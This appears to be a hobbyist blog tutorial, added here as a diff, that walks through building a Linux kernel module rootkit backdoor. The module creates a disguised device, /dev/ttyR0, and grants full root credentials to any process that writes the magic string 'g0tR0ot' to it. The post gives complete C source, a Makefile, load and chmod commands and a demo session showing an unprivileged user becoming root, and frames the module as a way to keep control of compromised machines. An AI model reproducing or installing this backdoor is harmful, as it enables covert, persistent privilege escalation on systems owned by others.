@@ -1,0 +1,244 @@
+Some people say that there are three things you have to do before you die: Write a book, have a child and plant a tree. Actually, the three things you have to do before you die are: write your own IRC bot, create a massive framework that only you will ever use and code an awesome Linux kernel module. I bet you had already build a couple of bots and, at least, one of those useless frameworks… after all you can do that on python or javascript… but the real thing… you have to do in C :stuck_out_tongue:
+
+Getting Started
+Let’s start with a very simple LKM that will allow us to get instant root on whatever machine we install it. Consider it as a quick way to re-gain control of a machine once it was compromised. This is one of the standard functions you’ll find in a rootkit.
+
+For writing this LKM I used the following great resources. Go and read them. I’m not going to repeat what is in there… specially because I couldn’t do it better.
+
+
+derekmolloy.ie
+
+Writing a Linux Kernel Module — Part 1: Introduction | derekmolloy.ie 941
+Guide to writing loadable kernel modules (LKMs) for embedded Linux devices (e.g., BeagleBone). Part 1 builds a "hello world" code example with custom parameters
+
+
+
+derekmolloy.ie
+
+Writing a Linux Kernel Module — Part 2: A Character Device | derekmolloy.ie 359
+Guide to writing loadable kernel modules (LKMs) for embedded Linux devices (e.g., BeagleBone). Part 2 builds a character driver for 3.x.x kernel devices.
+
+
+
+GitHub
+
+typoon/lkms 262
+Linux kernel modules developed by me for learning purposes - typoon/lkms
+
+The first two are great tutorials on the basics. The third is a module that does what we want, but didn’t worked for me at first and I had to modified it to get a functional version. The one I will show you in a while.
+
+Internals
+Giving root to a process is as easy as updating its associated credentials. However, we need a way to let the kernel know which process we want to grant those credentials to. There are different ways to interchange information between user space and kernel space. The traditional ioctl, the proc pseudo file system or a device driver among others. The last two have the extra advantage that can be easily accessed from the command line. We will be using a device driver for our example. (try to change it to use the proc file system as an exercise).
+
+The thing is pretty simple, when a process writes a magic string to our special device, our LKM will give root credentials to such process. You can change this approach in many different ways. For instance, another classical way of doing this is writing the PID of the process you want to grant permissions.
+
+The LKM
+So, this is the code:
+
+#include <linux/init.h>   
+#include <linux/module.h> 
+#include <linux/kernel.h>
+#include <linux/device.h>
+#include <linux/fs.h>    
+#include <asm/uaccess.h>
+#include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <linux/types.h>
+#include <linux/cdev.h>
+#include <linux/cred.h>
+#include <linux/version.h>
+
+#define  DEVICE_NAME "ttyR0" 
+#define  CLASS_NAME  "ttyR"  
+
+#if LINUX_VERSION_CODE > KERNEL_VERSION(3,4,0)
+#define V(x) x.val
+#else
+#define V(x) x
+#endif
+
+// Prototypes
+static int     __init root_init(void);
+static void    __exit root_exit(void);
+static int     root_open  (struct inode *inode, struct file *f);
+static ssize_t root_read  (struct file *f, char *buf, size_t len, loff_t *off);
+static ssize_t root_write (struct file *f, const char __user *buf, size_t len, loff_t *off);
+
+
+// Module info
+MODULE_LICENSE("GPL"); 
+MODULE_AUTHOR("pico");
+MODULE_DESCRIPTION("Got r00t!."); 
+MODULE_VERSION("0.1"); 
+
+static int            majorNumber; 
+static struct class*  rootcharClass  = NULL;
+static struct device* rootcharDevice = NULL;
+
+static struct file_operations fops =
+{
+  .owner = THIS_MODULE,
+  .open = root_open,
+  .read = root_read,
+  .write = root_write,
+};
+
+static int
+root_open (struct inode *inode, struct file *f)
+{
+   return 0;
+}
+
+static ssize_t
+root_read (struct file *f, char *buf, size_t len, loff_t *off)
+{
+  return len;
+}
+
+static ssize_t
+root_write (struct file *f, const char __user *buf, size_t len, loff_t *off)
+{ 
+  char   *data;
+  char   magic[] = "g0tR0ot";
+  struct cred *new_cred;
+  
+  data = (char *) kmalloc (len + 1, GFP_KERNEL);
+    
+  if (data)
+    {
+      copy_from_user (data, buf, len);
+        if (memcmp(data, magic, 7) == 0)
+	  {
+	    if ((new_cred = prepare_creds ()) == NULL)
+	      {
+		printk ("ttyRK: Cannot prepare credentials\n");
+		return 0;
+	      }
+	    printk ("ttyRK: You got it.\n");
+	    V(new_cred->uid) = V(new_cred->gid) =  0;
+	    V(new_cred->euid) = V(new_cred->egid) = 0;
+	    V(new_cred->suid) = V(new_cred->sgid) = 0;
+	    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
+	    commit_creds (new_cred);
+	  }
+        kfree(data);
+      }
+    else
+      {
+	printk(KERN_ALERT "ttyRK:Unable to allocate memory");
+      }
+    
+    return len;
+}
+
+
+static int __init
+root_init(void)
+{
+  printk ("ttyRK: LKM installed!\n");
+  // Create char device
+  if ((majorNumber = register_chrdev(0, DEVICE_NAME, &fops)) < 0)
+    {
+      printk(KERN_ALERT "ttyRK failed to register a major number\n");
+      return majorNumber;
+    }
+   printk(KERN_INFO "ttyRK: major number %d\n", majorNumber);
+ 
+   // Register the device class
+   rootcharClass = class_create(THIS_MODULE, CLASS_NAME);
+   if (IS_ERR(rootcharClass))
+     {
+       unregister_chrdev(majorNumber, DEVICE_NAME);
+       printk(KERN_ALERT "ttyRK: Failed to register device class\n");
+       return PTR_ERR(rootcharClass); 
+   }
+
+   printk(KERN_INFO "ttyRK: device class registered correctly\n");
+ 
+   // Register the device driver
+   rootcharDevice = device_create(rootcharClass, NULL,
+				  MKDEV(majorNumber, 0), NULL, DEVICE_NAME);
+   if (IS_ERR(rootcharDevice))
+     {
+       class_destroy(rootcharClass);
+       unregister_chrdev(majorNumber, DEVICE_NAME);
+       printk(KERN_ALERT "ttyRK: Failed to create the device\n");
+       return PTR_ERR(rootcharDevice);
+     }
+
+    return 0;
+    
+}
+
+static void __exit
+root_exit(void) 
+{
+  // Destroy the device
+  device_destroy(rootcharClass, MKDEV(majorNumber, 0));
+  class_unregister(rootcharClass);                     
+  class_destroy(rootcharClass);                        
+  unregister_chrdev(majorNumber, DEVICE_NAME);     
+
+  printk("ttyRK:Bye!\n");
+}
+
+
+module_init(root_init);
+module_exit(root_exit);
+
+If you had read the links I posted above, the code is self-explanatory. Otherwise, go and read them. The relevant part of the module is the write function. It gets the user space string that the process is trying to write to the device and compares it with a keyword. If it matches, the credentials are updated.
+
+	    if ((new_cred = prepare_creds ()) == NULL)
+	      {
+		printk ("ttyRK: Cannot prepare credentials\n");
+		return 0;
+	      }
+	    printk ("ttyRK: You got it.\n");
+	    V(new_cred->uid) = V(new_cred->gid) =  0;
+	    V(new_cred->euid) = V(new_cred->egid) = 0;
+	    V(new_cred->suid) = V(new_cred->sgid) = 0;
+	    V(new_cred->fsuid) = V(new_cred->fsgid) = 0;
+	    commit_creds (new_cred);
+As for kernel 3.4, the credential structure fields changed and that is why I have to use the macro. Check the macro definition at the beginning of the program. I had to navigate the LXR 37 a bit to find the proper structures and functions to call and which kernel version changed the struct cred (to write the conditional macro at the beginning of the code).
+
+There are other ways of getting the same behaviour but I leave that to you to explore. An interesting one is the technique used by the Mr Fontanini’s rootkit (https://github.com/mfontanini/Programs-Scripts/tree/master/rootkit 166). Haven’t checked whether still works on recent kernels so it is something interesting for you to also try.
+
+In case you haven’t read the links above (really, go and read them). This is the make file to build this module… The standard one
+
+obj-m+=root.o
+
+all:
+        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) modules
+clean:
+        make -C /lib/modules/$(shell uname -r)/build/ M=$(PWD) clean
+
+How to use this module
+So, you have type it and compile it. It’s time to try it.
+
+First open a terminal to monitor the kernel log
+
+$ tail -f /var/log/kern.log
+(The kernel log may be in a different file in your system. Check your distro documentation)
+
+Then we can load the module
+
+sudo insmod ./root.ko
+The log window will shown the initialisation messages and a new device will pop up under the /dev folder. Something called /dev/ttyR0. If you list the folder you will find a bunch of ttySOMETHING in there… our character device will be difficult to spot at first glance (we will see how to completely hide it a future instalment… hopefully).
+
+By default the device is only accessible by root so we need to change the permissions after loading our module
+
+$ sudo chmod 0666 /dev/ttyR0
+Another interesting exercise is to modify the module so the device is created with the permissions we want.
+
+Now we can use our root backdoor at any time from any terminal or program:
+
+$ id
+uid=1000(pico) gid=1000(pico) groups=1000(pico)
+$ echo "g0tR0ot" > /dev/ttyR0
+$ id
+uid=0(root) gid=0(root) groups=0(root)
+There is a lot of things you can try out of this simple example… So, what are you waiting for?
+
+Hack Fun
+
+
